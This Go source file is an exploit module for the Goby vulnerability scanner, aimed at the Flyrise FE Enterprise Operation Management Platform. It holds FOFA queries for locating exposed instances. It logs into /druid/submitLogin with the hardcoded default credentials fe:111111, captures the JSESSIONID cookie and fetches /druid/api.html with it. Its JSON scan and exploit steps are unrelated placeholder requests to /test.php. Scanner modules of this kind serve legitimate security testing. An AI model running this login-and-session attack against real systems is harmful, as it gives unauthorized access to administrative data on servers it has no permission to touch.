package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Flyrise-FE-Ent-Operation-MP /submitLogin Default Password Vulnerability",
    "Description": "<p>FE Enterprise Operation Management Platform is a cloud workbench based on cloud computing, intelligence, big data, Internet of Things, mobile Internet and other technical support. This platform can connect people, connect terminals, connect inside and outside, support the core needs of enterprises such as B2B, C2B and O2O, and provide support for the Internet+ transformation of customers in different industries.  </p><p>FE Enterprise Operation Management Platform /druid/login.html There is a weak password vulnerability in the login interface at the path, through which an unauthorized attacker can directly enter the background management page, obtain sensitive information, and further exploit it to control the entire server.</p>",
    "Product": "Flyrise-FE-Ent-Operation-MP",
    "Homepage": "https://www.flyrise.cn/",
    "DisclosureDate": "2024-04-08",
    "PostTime": "2024-11-13",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"js39/flyrise.stopBackspace.js\" || body=\"/js39/flyrise.dialog.js\" || (body=\"/js39/external/jquery\" && body=\"/css39/\") ",
    "GobyQuery": "body=\"js39/flyrise.stopBackspace.js\" || body=\"/js39/flyrise.dialog.js\" || (body=\"/js39/external/jquery\" && body=\"/css39/\") ",
    "Level": "1",
    "Impact": "<p>FE Enterprise Operation Management Platform /druid/login.html There is a weak password vulnerability in the login interface at the path, through which an unauthorized attacker can directly enter the background management page, obtain sensitive information, and further exploit it to control the entire server.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits. </p><p>2. If not necessary, prohibit public network access to the system. </p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/137518864"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,api.html",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "飞企互联-FE企业运营管理平台 /submitLogin 默认口令漏洞",
            "Product": "飞企互联-FE企业运营管理平台",
            "Description": "<p>飞企互联-FE企业运营管理平台是一个基于云计算、智能化、大数据、物联网、移动互联网等技术支撑的云工作台。这个平台可以连接人、链接端、联通内外，支持企业B2B、C2B与O2O等核心需求，为不同行业客户的互联网+转型提供支持。&nbsp;</p><p>飞企互联-FE企业运营管理平台 /druid/login.html 路径处的登录接口存在弱口令漏洞，未授权的攻击者可通过该漏洞直接进入后台管理页面，获取敏感信息，进一步利用可控制整个服务器。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。&nbsp;</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。<br></p>",
            "Impact": "<p>飞企互联-FE企业运营管理平台 /druid/login.html 路径处的登录接口存在弱口令漏洞，未授权的攻击者可通过该漏洞直接进入后台管理页面，获取敏感信息，进一步利用可控制整个服务器。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Flyrise-FE-Ent-Operation-MP /submitLogin Default Password Vulnerability",
            "Product": "Flyrise-FE-Ent-Operation-MP",
            "Description": "<p>FE Enterprise Operation Management Platform is a cloud workbench based on cloud computing, intelligence, big data, Internet of Things, mobile Internet and other technical support. This platform can connect people, connect terminals, connect inside and outside, support the core needs of enterprises such as B2B, C2B and O2O, and provide support for the Internet+ transformation of customers in different industries.&nbsp;&nbsp;</p><p>FE Enterprise Operation Management Platform /druid/login.html There is a weak password vulnerability in the login interface at the path, through which an unauthorized attacker can directly enter the background management page, obtain sensitive information, and further exploit it to control the entire server.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.&nbsp;</p><p>3. Set access policies and whitelist access through security devices such as firewalls.<br></p>",
            "Impact": "<p>FE Enterprise Operation Management Platform /druid/login.html There is a weak password vulnerability in the login interface at the path, through which an unauthorized attacker can directly enter the background management page, obtain sensitive information, and further exploit it to control the entire server.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9971"
}`
	sendPayloadasfjihuiashfyuyiaghsfkaghsjfayushasyhfjayuihjsc := func(hostInfo *httpclient.FixUrl) (bool, string, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：vulPath是默认口令请求路径，请以 "/login" 的格式返回
		// 注意：vulInfo是默认口令，请以 "admin:123456" 的格式返回
		vulInfo := `fe:111111`
		vulPath := `/druid/submitLogin`
		otherInfo := ``
		requestConfig := httpclient.NewPostRequestConfig(vulPath)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Timeout = 10
		requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		//command进行url编码
		requestConfig.Data = `loginUsername=fe&loginPassword=111111`
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil {
			err = errors.New("failed to RCE")
			return false, vulInfo, vulPath, otherInfo
		}
		// 如何返回数据包带有success
		if !strings.Contains(resp.RawBody, "success") {
			return false, vulInfo, vulPath, otherInfo
		}
		//正则匹配
		re, err := regexp.Compile(`JSESSIONID=(.*?);`)
		//检查是否有匹配到内容
		if !re.MatchString(resp.HeaderString.String()) {
			return false, vulInfo, vulPath, otherInfo
		}
		match := re.FindStringSubmatch(resp.HeaderString.String())
		otherInfo = match[0]

		return true, vulInfo, vulPath, otherInfo
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, vulInfo, vulPath, _ := sendPayloadasfjihuiashfyuyiaghsfkaghsjfayushasyhfjayuihjsc(hostInfo)

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://" + vulInfo + "@" + hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			_, vulInfo, _, cookie := sendPayloadasfjihuiashfyuyiaghsfkaghsjfayushasyhfjayuihjsc(expResult.HostInfo)
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" {
				// 请使用admin:123456去登录123
				expResult.Output = `Please use ` + vulInfo + ` to log in to ` + expResult.HostInfo.FixedHostInfo + `/druid/login.html`
				expResult.Success = true
			}
			if attacktype == "api.html" {
				expResult.Output = `Use cookie "` + cookie + "\" to visit /druid/api.html:\r\n"
				requestConfig := httpclient.NewGetRequestConfig("/druid/api.html")
				requestConfig.VerifyTls = false
				requestConfig.FollowRedirect = false
				requestConfig.Header.Store("Cookie", cookie)
				requestConfig.Timeout = 10
				resp, err := httpclient.DoHttpRequest(expResult.HostInfo, requestConfig)
				if err != nil {
					expResult.Output += "Failed to visit /druid/api.html"
					return expResult
				}
				expResult.Output += resp.RawBody
				// cookie验证逻辑
				expResult.Success = true
			}
			return expResult
		},
	))
}
